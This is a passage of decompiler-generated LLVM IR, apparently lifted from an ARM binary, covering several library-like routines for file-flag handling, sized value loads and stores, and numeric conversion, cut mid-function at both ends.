  %v0_117e8.v0_117f4 = select i1 %v3_117f4, i32 %v0_117e8, i32 %v0_117f4
  store i32 %v0_117e8.v0_117f4, i32* @r4, align 4
  %v2_11800 = sub i32 %v0_117f4, %v0_117e8.v0_117f4
  %v0_11804 = load i32, i32* %r7.global-to-local, align 4
  %v2_11804 = add i32 %v0_11804, %v2_11800
  store i32 %v2_11804, i32* %r7.global-to-local, align 4
  store i32 %v0_117e8.v0_117f4, i32* @r2, align 4
  %v4_11814 = call i32 @function_12940(i32 %v2_11804, i32 10, i32 %v0_117e8.v0_117f4, i32 %v2_11800)
  %v2_11818 = icmp eq i32 %v4_11814, 0
  br i1 %v2_11818, label %dec_label_pc_11870, label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_117f4
  %v0_11820 = load i32, i32* @r5, align 4
  %v1_11820 = add i32 %v0_11820, 16
  %v2_11820 = inttoptr i32 %v1_11820 to i32*
  %v3_11820 = load i32, i32* %v2_11820, align 4
  %v0_11824 = load i32, i32* %r7.global-to-local, align 4
  %v1_11824 = load i32, i32* @r4, align 4
  %v2_11824 = sub i32 %v0_11824, %v4_11814
  %v2_11828 = add i32 %v2_11824, %v1_11824
  %v2_1182c = sub i32 %v3_11820, %v2_11828
  %v1_11830 = load i32, i32* @r6, align 4
  %v2_11830 = sub i32 %v1_11830, %v2_11828
  store i32 %v2_11830, i32* @r6, align 4
  store i32 %v2_1182c, i32* %v2_11820, align 4
  br label %dec_label_pc_11870

dec_label_pc_1183c:                               ; preds = %dec_label_pc_1179c
  %v1_1183c = add i32 %arg3, 8
  %v2_1183c = inttoptr i32 %v1_1183c to i32*
  %v3_1183c = load i32, i32* %v2_1183c, align 4
  %v9_11840 = icmp eq i32 %v3_11768, %v3_1183c
  br i1 %v9_11840, label %dec_label_pc_1185c, label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_1183c
  store i32 %arg3, i32* @r0, align 4
  %v0_1184c = call i32 @function_d8c8()
  %v2_11850 = icmp eq i32 %v0_1184c, 0
  br i1 %v2_11850, label %dec_label_pc_11848.dec_label_pc_1185c_crit_edge, label %bb13

dec_label_pc_11848.dec_label_pc_1185c_crit_edge:  ; preds = %dec_label_pc_11848
  %v0_11864.pre = load i32, i32* @r6, align 4
  %v0_1185c.pre = load i32, i32* @r5, align 4
  %v0_11860.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_11868.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_1185c

bb13:                                             ; preds = %dec_label_pc_11848
  %v1_11854 = load i32, i32* @r4, align 4
  store i32 %v1_11854, i32* @r6, align 4
  br label %dec_label_pc_11870

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11848.dec_label_pc_1185c_crit_edge, %dec_label_pc_11740, %dec_label_pc_1183c
  %v2_11868 = phi i32 [ %v2_11868.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %v3_11740, %dec_label_pc_11740 ], [ %v3_11740, %dec_label_pc_1183c ]
  %v0_11860 = phi i32 [ %v0_11860.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg1, %dec_label_pc_11740 ], [ %arg1, %dec_label_pc_1183c ]
  %v0_1185c = phi i32 [ %v0_1185c.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg3, %dec_label_pc_11740 ], [ %arg3, %dec_label_pc_1183c ]
  %v0_11864 = phi i32 [ %v0_11864.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg2, %dec_label_pc_11740 ], [ %arg2, %dec_label_pc_1183c ]
  store i32 %v2_11868, i32* @r4, align 4
  store i32 %v9_11740, i32* @r6, align 4
  store i32 %v15_11740, i32* @lr, align 4
  %v3_1186c = inttoptr i32 %v0_1185c to i8*
  %v4_1186c = call i32 @function_11684(i8* %v3_1186c, i32 %v0_11860, i32 %v0_11864)
  br label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %bb13, %dec_label_pc_117f4, %dec_label_pc_117e4, %dec_label_pc_117cc, %dec_label_pc_117a8, %dec_label_pc_11820, %bb10, %dec_label_pc_1185c
  %v0_11870 = load i32, i32* @r6, align 4
  %v2_11874 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11874, i32* @r4, align 4
  store i32 %v6_11740, i32* @r5, align 4
  store i32 %v9_11740, i32* @r6, align 4
  store i32 %v12_11740, i32* @r7, align 4
  ret i32 %v0_11870

; uselistorder directives
  uselistorder i32 %v2_11828, { 1, 0 }
  uselistorder i32 %v2_11800, { 1, 0 }
  uselistorder i32 %v0_117e8.v0_117f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_117f4, { 1, 0, 2 }
  uselistorder i32 %v2_11774, { 2, 0, 1, 3 }
  uselistorder i32 %v9_11740, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 7, 2, 4, 3, 6, 8, 5 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11870, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1185c, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_11878(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11878:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11878 = load i32, i32* @r4, align 4
  store i32 %v3_11878, i32* %stack_var_-8, align 4
  %v3_1187c = load i8, i8* %arg1, align 1
  %v4_1187c = zext i8 %v3_1187c to i32
  store i32 %v4_1187c, i32* %r2.global-to-local, align 4
  %v2_11880 = add i32 %tmp, 1
  %v3_11880 = inttoptr i32 %v2_11880 to i8*
  %v4_11880 = load i8, i8* %v3_11880, align 1
  %v5_11880 = zext i8 %v4_11880 to i32
  store i32 %v5_11880, i32* %r3.global-to-local, align 4
  %v4_11884 = mul nuw nsw i32 %v5_11880, 256
  %v5_11884 = or i32 %v4_11884, %v4_1187c
  store i32 %v5_11884, i32* %r2.global-to-local, align 4
  %v2_11888 = and i32 %v5_11884, %arg2
  %v4_11888 = icmp eq i32 %v2_11888, 0
  store i1 %v4_11888, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_11888, label %dec_label_pc_11894, label %dec_label_pc_118ac

dec_label_pc_11894:                               ; preds = %dec_label_pc_11878
  %v1_11894 = and i32 %v5_11884, 2176
  %v2_11894 = icmp eq i32 %v1_11894, 0
  store i1 %v2_11894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11894, label %dec_label_pc_1189c, label %dec_label_pc_118c0

dec_label_pc_1189c:                               ; preds = %dec_label_pc_11894
  %v2_1189c = or i32 %v5_11884, %arg2
  store i32 %v2_1189c, i32* %r2.global-to-local, align 4
  %v3_118a0 = sdiv i32 %v2_1189c, 256
  store i32 %v3_118a0, i32* %r3.global-to-local, align 4
  %v1_118a4 = trunc i32 %v3_118a0 to i8
  store i8 %v1_118a4, i8* %v3_11880, align 1
  %v0_118a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_118a8 = trunc i32 %v0_118a8 to i8
  store i8 %v1_118a8, i8* %arg1, align 1
  %v0_118ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_118ac

dec_label_pc_118ac:                               ; preds = %dec_label_pc_11878, %dec_label_pc_1189c
  %v0_118f8 = phi i32 [ %tmp, %dec_label_pc_11878 ], [ %v0_118ac.pre, %dec_label_pc_1189c ]
  %v1_118ac = inttoptr i32 %v0_118f8 to i8*
  %v2_118ac = load i8, i8* %v1_118ac, align 1
  %v3_118ac = zext i8 %v2_118ac to i32
  store i32 %v3_118ac, i32* %r2.global-to-local, align 4
  %v1_118b0 = add i32 %v0_118f8, 1
  %v2_118b0 = inttoptr i32 %v1_118b0 to i8*
  %v3_118b0 = load i8, i8* %v2_118b0, align 1
  %v4_118b0 = zext i8 %v3_118b0 to i32
  store i32 %v4_118b0, i32* %r3.global-to-local, align 4
  %v4_118b4 = mul nuw nsw i32 %v4_118b0, 256
  %v5_118b4 = or i32 %v4_118b4, %v3_118ac
  store i32 %v5_118b4, i32* @ip, align 4
  %v1_118b8 = and i32 %v3_118ac, 32
  %v2_118b8 = icmp eq i32 %v1_118b8, 0
  store i1 %v2_118b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118b8, label %dec_label_pc_118e8, label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_11894, %dec_label_pc_118ac
  %v0_118c0 = call i32 @function_cec4()
  store i32 %v0_118c0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_118c8 = inttoptr i32 %v0_118c0 to i32*
  store i32 9, i32* %v2_118c8, align 4
  br label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_11910, %dec_label_pc_118c0
  %v0_118cc = load i32, i32* @r4, align 4
  %v1_118cc = inttoptr i32 %v0_118cc to i32*
  %v2_118cc = load i32, i32* %v1_118cc, align 4
  %v1_118d0 = or i32 %v2_118cc, 8
  store i32 %v1_118d0, i32* %r3.global-to-local, align 4
  %v3_118d4 = sdiv i32 %v2_118cc, 256
  store i32 %v3_118d4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_118dc = trunc i32 %v3_118d4 to i8
  %v3_118dc = add i32 %v0_118cc, 1
  %v4_118dc = inttoptr i32 %v3_118dc to i8*
  store i8 %v1_118dc, i8* %v4_118dc, align 1
  %v0_118e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_118e0 = trunc i32 %v0_118e0 to i8
  %v2_118e0 = load i32, i32* @r4, align 4
  %v3_118e0 = inttoptr i32 %v2_118e0 to i8*
  store i8 %v1_118e0, i8* %v3_118e0, align 1
  %v2_118e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_118e4, i32* @r4, align 4
  ret i32 -1

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118ac
  %tmp15 = urem i8 %v2_118ac, 4
  %v2_118e8 = icmp eq i8 %tmp15, 0
  store i1 %v2_118e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118e8, label %dec_label_pc_1194c, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118e8
  %v1_118f0 = and i32 %v3_118ac, 4
  store i32 %v1_118f0, i32* @r1, align 4
  %v2_118f0 = icmp eq i32 %v1_118f0, 0
  store i1 %v2_118f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118f0, label %dec_label_pc_118f8, label %dec_label_pc_11928

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118f0
  %v1_118f8 = add i32 %v0_118f8, 20
  %v2_118f8 = inttoptr i32 %v1_118f8 to i32*
  %v3_118f8 = load i32, i32* %v2_118f8, align 4
  store i32 %v3_118f8, i32* %r2.global-to-local, align 4
  %v1_118fc = add i32 %v0_118f8, 16
  %v2_118fc = inttoptr i32 %v1_118fc to i32*
  %v3_118fc = load i32, i32* %v2_118fc, align 4
  store i32 %v3_118fc, i32* %r3.global-to-local, align 4
  %v9_11900 = icmp eq i32 %v3_118f8, %v3_118fc
  store i1 %v9_11900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11900, label %dec_label_pc_11908, label %dec_label_pc_11910

dec_label_pc_11908:                               ; preds = %dec_label_pc_118f8
  %v1_11908 = and i32 %v3_118ac, 2
  %v2_11908 = icmp eq i32 %v1_11908, 0
  store i1 %v2_11908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11908, label %dec_label_pc_11928, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_118f8, %dec_label_pc_11908
  %v1_11910 = and i32 %v4_118b4, 1024
  %v2_11910 = icmp eq i32 %v1_11910, 0
  store i1 %v2_11910, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_11910, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_1191c = call i32 @function_13960()
  store i32 %v0_1191c, i32* %r0.global-to-local, align 4
  %v2_11920 = icmp eq i32 %v0_1191c, 0
  store i1 %v2_11920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11920, label %.dec_label_pc_11928_crit_edge, label %dec_label_pc_118cc

.dec_label_pc_11928_crit_edge:                    ; preds = %dec_label_pc_11910
  %v0_11928.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %.dec_label_pc_11928_crit_edge, %dec_label_pc_118f0, %dec_label_pc_11908
  %v2_11938 = phi i32 [ %v0_11928.pre, %.dec_label_pc_11928_crit_edge ], [ %v0_118f8, %dec_label_pc_118f0 ], [ %v0_118f8, %dec_label_pc_11908 ]
  %v1_11928 = inttoptr i32 %v2_11938 to i32*
  %v2_11928 = load i32, i32* %v1_11928, align 4
  store i32 %v2_11928, i32* %r3.global-to-local, align 4
  %v1_1192c = add i32 %v2_11938, 8
  %v2_1192c = inttoptr i32 %v1_1192c to i32*
  %v3_1192c = load i32, i32* %v2_1192c, align 4
  store i32 %v3_1192c, i32* %r1.global-to-local, align 4
  %v1_11930 = and i32 %v2_11928, -4
  store i32 %v1_11930, i32* %r3.global-to-local, align 4
  %v3_11934 = sdiv i32 %v2_11928, 256
  store i32 %v3_11934, i32* %r2.global-to-local, align 4
  %v1_11938 = trunc i32 %v3_11934 to i8
  %v3_11938 = add i32 %v2_11938, 1
  %v4_11938 = inttoptr i32 %v3_11938 to i8*
  store i8 %v1_11938, i8* %v4_11938, align 1
  %v0_1193c = load i32, i32* %r1.global-to-local, align 4
  %v1_1193c = load i32, i32* @r4, align 4
  %v2_1193c = add i32 %v1_1193c, 20
  %v3_1193c = inttoptr i32 %v2_1193c to i32*
  store i32 %v0_1193c, i32* %v3_1193c, align 4
  %v0_11940 = load i32, i32* %r3.global-to-local, align 4
  %v1_11940 = trunc i32 %v0_11940 to i8
  %v2_11940 = load i32, i32* @r4, align 4
  %v3_11940 = inttoptr i32 %v2_11940 to i8*
  store i8 %v1_11940, i8* %v3_11940, align 1
  %v0_11944 = load i32, i32* %r1.global-to-local, align 4
  %v1_11944 = load i32, i32* @r4, align 4
  %v2_11944 = add i32 %v1_11944, 24
  %v3_11944 = inttoptr i32 %v2_11944 to i32*
  store i32 %v0_11944, i32* %v3_11944, align 4
  %v0_11948 = load i32, i32* %r1.global-to-local, align 4
  %v1_11948 = load i32, i32* @r4, align 4
  %v2_11948 = add i32 %v1_11948, 16
  %v3_11948 = inttoptr i32 %v2_11948 to i32*
  store i32 %v0_11948, i32* %v3_11948, align 4
  %v0_1194c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_118e8, %dec_label_pc_11928
  %v2_11958 = phi i32 [ %v0_118f8, %dec_label_pc_118e8 ], [ %v0_1194c.pre, %dec_label_pc_11928 ]
  %v1_1194c = inttoptr i32 %v2_11958 to i32*
  %v2_1194c = load i32, i32* %v1_1194c, align 4
  %v1_11950 = or i32 %v2_1194c, 64
  store i32 %v1_11950, i32* %r2.global-to-local, align 4
  %v3_11954 = sdiv i32 %v2_1194c, 256
  store i32 %v3_11954, i32* %r3.global-to-local, align 4
  %v1_11958 = trunc i32 %v3_11954 to i8
  %v3_11958 = add i32 %v2_11958, 1
  %v4_11958 = inttoptr i32 %v3_11958 to i8*
  store i8 %v1_11958, i8* %v4_11958, align 1
  %v0_1195c = load i32, i32* @r4, align 4
  %v1_1195c = add i32 %v0_1195c, 1
  %v2_1195c = inttoptr i32 %v1_1195c to i8*
  %v3_1195c = load i8, i8* %v2_1195c, align 1
  %v4_1195c = zext i8 %v3_1195c to i32
  %v3_11960 = mul nuw nsw i32 %v4_1195c, 256
  store i32 %v3_11960, i32* %r3.global-to-local, align 4
  %v1_11964 = and i32 %v3_11960, 2816
  store i32 %v1_11964, i32* %r0.global-to-local, align 4
  %v2_11964 = icmp eq i32 %v1_11964, 0
  store i1 %v2_11964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11964, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_1194c
  %v2_11968 = add i32 %v0_1195c, 12
  %v3_11968 = inttoptr i32 %v2_11968 to i32*
  %v4_11968 = load i32, i32* %v3_11968, align 4
  store i32 %v4_11968, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_1194c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_11970 = load i32, i32* %r2.global-to-local, align 4
  %v1_11970 = trunc i32 %v0_11970 to i8
  %v3_11970 = inttoptr i32 %v0_1195c to i8*
  store i8 %v1_11970, i8* %v3_11970, align 1
  %v0_11974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11974, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_11974 = load i32, i32* %r3.global-to-local, align 4
  %v2_11974 = load i32, i32* @r4, align 4
  %v3_11974 = add i32 %v2_11974, 28
  %v4_11974 = inttoptr i32 %v3_11974 to i32*
  store i32 %v1_11974, i32* %v4_11974, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_11978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11978, i32* @r4, align 4
  %v8_11978 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11978

; uselistorder directives
  uselistorder i32 %v3_11960, { 1, 0 }
  uselistorder i32 %v3_11954, { 1, 0 }
  uselistorder i32 %v3_11934, { 1, 0 }
  uselistorder i32 %v2_11938, { 0, 2, 1 }
  uselistorder i1 %v2_118e8, { 1, 0 }
  uselistorder i32 %v3_118d4, { 1, 0 }
  uselistorder i32 %v3_118ac, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_118f8, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_118a0, { 1, 0 }
  uselistorder i32 %v5_11884, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0, 4, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_1194c, { 1, 0 }
  uselistorder label %dec_label_pc_11928, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11910, { 1, 0 }
  uselistorder label %dec_label_pc_118c0, { 1, 0 }
  uselistorder label %dec_label_pc_118ac, { 1, 0 }
}

define i32 @function_1197c() local_unnamed_addr {
dec_label_pc_1197c:
  %v0_1197c = load i32, i32* @r2, align 4
  %v1_1197c = icmp slt i32 %v0_1197c, 0
  %v0_11980 = load i32, i32* @r0, align 4
  %v1_11984 = and i32 %v0_11980, 2048
  %v2_119b8 = icmp eq i32 %v1_11984, 0
  br i1 %v1_1197c, label %dec_label_pc_119b8, label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_1197c
  br i1 %v2_119b8, label %dec_label_pc_11994, label %dec_label_pc_119c0

dec_label_pc_11994:                               ; preds = %dec_label_pc_1198c
  %v7_11994 = icmp eq i32 %v0_11980, 256
  %v0_11998 = load i32, i32* @r1, align 4
  %v1_11998 = inttoptr i32 %v0_11998 to i32*
  %v2_11998 = load i32, i32* %v1_11998, align 4
  %v2_1199c = urem i32 %v2_11998, 256
  %v2_1199c.v2_11998 = select i1 %v7_11994, i32 %v2_1199c, i32 %v2_11998
  br i1 %v7_11994, label %.thread, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11994
  %v7_119a4 = icmp eq i32 %v0_11980, 512
  br i1 %v7_119a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_119a4
  %v4_119ac = urem i32 %v2_1199c.v2_11998, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_119a4, %dec_label_pc_11994, %bb
  %v1_119b4 = phi i32 [ %v2_11998, %dec_label_pc_119a4 ], [ %v2_1199c, %dec_label_pc_11994 ], [ %v4_119ac, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_119b4

dec_label_pc_119b8:                               ; preds = %dec_label_pc_1197c
  br i1 %v2_119b8, label %dec_label_pc_119c8, label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %dec_label_pc_1198c, %dec_label_pc_119b8
  %v0_119c0 = load i32, i32* @r1, align 4
  %v1_119c0 = inttoptr i32 %v0_119c0 to i32*
  %v2_119c0 = load i32, i32* %v1_119c0, align 4
  %v3_119c0 = add i32 %v0_119c0, 4
  %v4_119c0 = inttoptr i32 %v3_119c0 to i32*
  %v5_119c0 = load i32, i32* %v4_119c0, align 4
  store i32 %v5_119c0, i32* @r1, align 4
  ret i32 %v2_119c0

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b8
  %v7_119c8 = icmp eq i32 %v0_11980, 256
  %v0_119cc = load i32, i32* @r1, align 4
  %v1_119cc = inttoptr i32 %v0_119cc to i32*
  %v2_119cc = load i32, i32* %v1_119cc, align 4
  %v2_119d0 = urem i32 %v2_119cc, 256
  %v2_119d0.v2_119cc = select i1 %v7_119c8, i32 %v2_119d0, i32 %v2_119cc
  br i1 %v7_119c8, label %.thread2, label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119c8
  %v7_119d8 = icmp eq i32 %v0_11980, 512
  br i1 %v7_119d8, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_119d8
  %v4_119dc = mul i32 %v2_119d0.v2_119cc, 65536
  %v4_119e0 = sdiv i32 %v4_119dc, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_119d8, %dec_label_pc_119c8, %bb5
  %v0_119e4 = phi i32 [ %v2_119cc, %dec_label_pc_119d8 ], [ %v2_119d0, %dec_label_pc_119c8 ], [ %v4_119e0, %bb5 ]
  %v3_119e4 = ashr i32 %v0_119e4, 31
  store i32 %v3_119e4, i32* @r1, align 4
  ret i32 %v0_119e4

; uselistorder directives
  uselistorder i32 %v0_119e4, { 1, 0 }
  uselistorder i32 %v2_119d0, { 1, 0 }
  uselistorder i32 %v2_119cc, { 1, 2, 0 }
  uselistorder i32 %v2_1199c, { 1, 0 }
  uselistorder i32 %v2_11998, { 1, 2, 0 }
  uselistorder i1 %v2_119b8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_119ec(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_119ec:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_119ec = icmp eq i32 %arg2, 256
  br i1 %v7_119ec, label %dec_label_pc_11a18, label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119ec
  %v7_119f4 = icmp eq i32 %arg2, 2048
  br i1 %v7_119f4, label %dec_label_pc_119fc, label %dec_label_pc_11a04

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119f4
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_119fc = add i32 %tmp2, 4
  %v6_119fc = inttoptr i32 %v5_119fc to i32*
  store i32 %arg4, i32* %v6_119fc, align 4
  ret i32 %tmp2

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119f4
  %v7_11a04 = icmp eq i32 %arg2, 512
  %v4_11a08 = sdiv i32 %arg3, 256
  store i32 %v4_11a08, i32* @ip, align 4
  br i1 %v7_11a04, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_11a04
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_11a04
  %v1_11a14 = trunc i32 %v4_11a08 to i8
  %v4_11a14 = add i32 %tmp2, 1
  %v5_11a14 = inttoptr i32 %v4_11a14 to i8*
  store i8 %v1_11a14, i8* %v5_11a14, align 1
  br label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_119ec, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_11a08, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11a18, { 1, 0 }
}

define i32 @function_11a20(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11a20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_11a24 = icmp slt i32 %arg4, 0
  %v2_11a24 = icmp eq i32 %arg4, 0
  store i1 %v2_11a24, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_11a24, label %dec_label_pc_11a3c, label %dec_label_pc_11a5c

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a20
  %v1_11a3c = icmp slt i32 %arg3, 0
  %v2_11a3c = icmp eq i32 %arg3, 0
  store i1 %v2_11a3c, i1* %cpsr_z.global-to-local, align 1
  %v1_11a40 = sub i32 0, %arg4
  store i32 %v1_11a40, i32* %r7.global-to-local, align 4
  br i1 %v1_11a3c, label %dec_label_pc_11a48, label %dec_label_pc_11a5c

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a3c
  %v1_11a4c = sub i32 0, %arg2
  store i32 %v1_11a4c, i32* %r5.global-to-local, align 4
  %v2_11a4c = icmp eq i32 %arg2, 0
  %v2_11a50 = icmp eq i1 %v2_11a4c, false
  %v5_11a50 = sext i1 %v2_11a50 to i32
  %v6_11a50 = sub i32 %v5_11a50, %arg3
  store i32 %v6_11a50, i32* %r6.global-to-local, align 4
  %v19_11a50 = icmp eq i32 %v6_11a50, 0
  store i1 %v19_11a50, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a64

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a3c, %dec_label_pc_11a20
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a48, %dec_label_pc_11a5c
  %storemerge = phi i8 [ 0, %dec_label_pc_11a5c ], [ 1, %dec_label_pc_11a48 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_11a6c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11a6c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_11a74 = call i32 @function_14f20()
  store i32 %v0_11a74, i32* %fp.global-to-local, align 4
  %v2_11a84 = call i32 @function_ca30(i32 -1, i32 %v0_11a6c)
  %v1_11a88 = add i32 %v2_11a84, 1
  store i32 %v1_11a88, i32* %sb.global-to-local, align 4
  %v1_11a8c = load i32, i32* %r7.global-to-local, align 4
  %v9_11a8c = icmp eq i32 %v1_11a88, %v1_11a8c
  store i1 %v9_11a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11a8c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a64
  %v1_11a90 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_11a90, i32* %sb.global-to-local, align 4
  %v1_11a94 = load i32, i32* %fp.global-to-local, align 4
  %v2_11a94 = add i32 %v1_11a94, 1
  store i32 %v2_11a94, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a64, %bb
  %v0_11a98 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11a98, i32* %sl.global-to-local, align 4
  %v0_11a9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11a9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11aa0thread-pre-split:               ; preds = %bb19
  %v0_11aa0.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_11aa8.pre = load i32, i32* %r7.global-to-local, align 4
